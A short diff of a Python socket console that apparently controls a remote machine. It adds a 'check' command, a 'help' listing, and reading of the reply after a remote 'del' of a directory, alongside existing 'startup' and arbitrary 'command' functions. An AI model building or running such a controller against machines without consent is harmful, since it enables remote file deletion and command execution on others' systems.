@@ -37,12 +37,17 @@ def process_input():
             try:
                 conn.sendall("del".encode("utf-8"))
                 conn.sendall(directory.encode("utf-8"))
+                try:
+                    del_data = (conn.recv(2048)).decode("utf-8")
+                    print(del_data)
+                except:
+                    print("Error: Could not get del_data...")
             except:
                 print("Error: could not send " + str(input_data) + " command")
         elif input_data == "startup":
             try:
                 conn.sendall("startup".encode("utf-8"))
-                startup_data = conn.recv(2048).decode("utf-8")
+                startup_data = (conn.recv(2048)).decode("utf-8")
                 print(startup_data)
             except:
                 print("Error: could not send " + str(input_data) + " command")
@@ -53,6 +58,15 @@ def process_input():
                 conn.sendall(command.encode("utf-8"))
                 threading.Thread(target = data_input).start()
                 time.sleep(2)
+            except:
+                print("Error: could not send " + str(input_data) + " command")
+        elif input_data == "help":
+            print("user\ntree\ndel\ncommand\nstartup\ncheck")
+        elif input_data == "check":
+            try:
+                conn.sendall("check".encode("utf-8"))
+                check_data = (conn.recv(1024)).decode("utf-8")
+                print(check_data)
             except:
                 print("Error: could not send " + str(input_data) + " command")
 
